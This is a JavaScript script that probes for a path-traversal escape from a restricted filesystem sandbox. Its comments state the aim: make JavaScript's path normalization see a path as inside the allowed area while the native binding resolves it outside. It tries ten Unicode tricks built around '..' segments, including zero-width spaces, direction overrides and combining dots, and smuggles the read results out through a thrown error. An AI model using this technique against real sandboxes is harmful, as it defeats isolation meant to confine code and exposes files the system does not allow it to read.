var out = {};
function S(x,n){ try { return String(x).slice(0,n||90); } catch(e){ return "?"; } }
// UNSAFE direction: make JS-normalize return an INSIDE path, but have the NATIVE binding resolve OUTSIDE.
// Key idea: JS `normalize` pops on ".." only when b.length>0. If a segment is dropped by JS but NOT by
// native, the ".." count differs. U+2025 was KEPT by JS. What segment does JS DROP but native KEEP?
// JS normalize filters: h !== "."  (so "." is dropped). Does native drop "." ? Yes (tested).
// What about a segment that JS drops via the filter `!!h` (empty) but native keeps as a name?
// Try: a segment consisting of only whitespace, or a zero-width char.
var z = "\u200B"; // zero width space
var tests = {
  "zwsp segment":       "/node_modules/@dataform/core/" + z + "/../package.json",
  "zwsp as dotdot":     "/node_modules/@dataform/core/" + z + z + "/../package.json",
  "nbsp dotdot":        "/node_modules/@dataform/core/\u00A0../package.json",
  "zwsp+dotdot combo":  "/node_modules/@dataform/core/." + z + "./package.json",
  "empty-ish name":     "/node_modules/@dataform/core/\u0001/package.json",
  "RTL override":       "/node_modules/@dataform/core/\u202E../package.json",
  "LRO override":       "/node_modules/@dataform/core/\u202D../package.json",
  "combining dot":      "/node_modules/@dataform/core/.\u0307./package.json",
  "soft hyphen":        "/node_modules/@dataform/core/\u00AD../package.json",
  "word joiner":        "/node_modules/@dataform/core/\u2060../package.json"
};
out.t = {};
Object.keys(tests).forEach(function(k){
  var p = tests[k];
  var js; try { js = path.normalize(p); } catch(e){ js = "EXC"; }
  var ex; try { ex = String(restricted_fs.exists(p)); } catch(e){ ex = "X:"+S(e,35); }
  var rd; try { var r=restricted_fs.readFile(p); rd="READ("+r.length+")"; } catch(e){ rd="no"; }
  // does JS-normalized path still contain a .. ? if JS dropped it, that's the divergence
  out.t[k] = { js: S(js,80), ex: ex, rd: rd };
});
throw new Error("DIFF2::" + JSON.stringify(out.t));
